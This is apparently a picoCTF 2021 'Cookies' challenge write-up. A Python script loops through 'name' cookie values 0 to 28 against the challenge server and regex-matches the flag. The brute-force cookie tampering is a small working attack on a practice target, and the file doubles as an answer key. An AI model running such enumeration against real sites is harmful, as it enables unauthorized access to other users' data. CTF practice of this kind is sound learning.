# picoCTF challenge Cookies.

# Tags: 
# 40 points
# picoCTF 2021
# Web Exploitation

# Description:
# Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:54219/

# Visiting the website with our browser we see a search field for cookies.
# The default search suggestion is "snickerdoodle".
# The 'name' field in the browser cookie changes from -1 to 0 when we search for snickerdoodle.
# Changing the browser cookie value to 1 shows the search result for "chocolate chip" cookie.
# There are many tasty cookies but no more than 29. One of these should be the flag.
# We could iterate through these manually in the browser but that's just tedious.

# Lets write a python script instead!

import requests
import re

url = 'http://mercury.picoctf.net:54219'
cookie = {}
flag = ''

print("\n\n\n### Initializing cookie brute force attack on " + url + " ###\n\n\n")
for value in range(29):	
    # Creates a key:value pair {'name':'0'}.
    cookie['name'] = str(value)
    # Sends a GET request with the cookie above.
    response = requests.get(url, cookies=cookie)
    # Checks the HTML response text for picoCTF{xxxx} flag using regular expressions. Assigns it to a variable if found.
    flag = re.findall("picoCTF{.*}", response.text)
    # Checks the response for *edible* cookies, just for fun.
    false_flag = re.findall("I love.*cookies!", response.text)

    print("Sending cookie: 'name' : '" + cookie['name'] + "'") 
    if false_flag:
        print("\tResponse: " + ''.join(false_flag) + "\n")
    if flag:
        print("\tResponse: " + ''.join(flag) + "\n")  
        true_flag = ''.join(flag)

print("\n\n### The flag is: " + true_flag + " ###\n\n")

